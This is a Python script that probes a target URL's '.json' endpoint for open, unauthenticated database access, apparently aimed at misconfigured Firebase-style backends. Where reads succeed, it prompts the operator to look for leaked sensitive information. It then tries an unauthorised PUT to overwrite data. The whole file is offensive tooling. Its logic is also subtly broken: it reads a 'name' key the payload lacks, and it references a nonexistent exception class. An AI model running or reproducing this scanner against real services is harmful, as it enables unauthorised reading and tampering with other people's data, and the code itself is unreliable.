import requests


headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"}

class Core():
    def __init__(self, url):
        self.target = url


    def is_alive(self):
        try:
            r = requests.get(self.target, headers=headers, timeout=10)
            if r.status_code == 404 or r.status_code == 500:
                print(f"[!] URL {self.target} not avaliable")
            else:
                print("[*] it's ok, trying to exploiting..")
                self.json_flaw()
        except (requests.exceptions.BaseHTTPError,requests.exceptions.Timeout) as e:
            print(e)


    def json_flaw(self):
        exploit = self.target + ".json"
        try:
            r = requests.get(exploit, headers=headers, timeout=3)
            if r.status_code == 401 or "Permission denied" in r.text:
                print(f"[!] Target: {exploit} not vulnerable i got {r.status_code} status code.")
            else:
                # ugly condition.. 
                if r.status_code == 200:
                    print(f"[*] Target is vulnerable\ncopy the URL {exploit} and verify possible leaks of sensitive information")
                    print("[->] Testing for writing permissions")
                    data = {"error":"nullfil3"}
                    try:
                        resp = requests.put(exploit, json=data, timeout=30)
                        if "Exploit" in resp.text and data['name'] in resp.text:
                            print("[*] Target is exploitable!!")
                    except (requests.exceptions.HTTPError,requests.Timeout) as e:
                        print(f"[!] i cant upload the file :/ i got {e}")
        except (requests.exceptions.BaseHTTPError,requests.exceptions.Timeout) as e:
            print(f"[!] Error while trying to connect at: {exploit}\n--> {e} ")
